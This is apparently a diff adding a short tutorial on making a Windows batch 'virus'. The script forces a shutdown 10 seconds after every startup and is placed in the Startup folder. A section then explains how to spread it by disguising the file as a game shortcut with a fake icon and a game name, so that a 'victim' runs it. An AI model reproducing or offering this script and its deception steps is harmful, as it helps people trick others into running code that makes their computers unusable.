@@ -1,0 +1,42 @@
+Shutdown the computer every time on startup!
+Here is how ?
+
+? Open Notepad
+
+? Type :
+
+@ECHO OFF
+
+shutdown -s -t 10 -c “Virus Attack…”
+
+exit
+
+? File >> Save As…
+
+? Name it: virus.bat
+
+? Start >> All Programs
+
+? Right Click on Startup >> Open
+
+? This open the Startup folder
+
+? Paste the Virus.bat file here!
+
+*** That’s all, now the computer will
+
+automatically shut down on every startup!
+
+How to Spread it:
+
+Windows doesn’t allow to change the icon of .bat files. Therefore what you can do is :
+
+Right-click on the .bat file
+Click on CREATE SHORTCUT
+And hide the original file.
+Now as this newly created file is just the shortcut, you can easily change its icon.
+Right-click on this shortcut
+properties >>>..cutomize>>..choose icon
+Now give an attractive icon to it.
+Now name it something interesting. eg. PROTOTYPE or IGI etc.
+Now your victim would think it to be the game, and he will be easily corrupted.
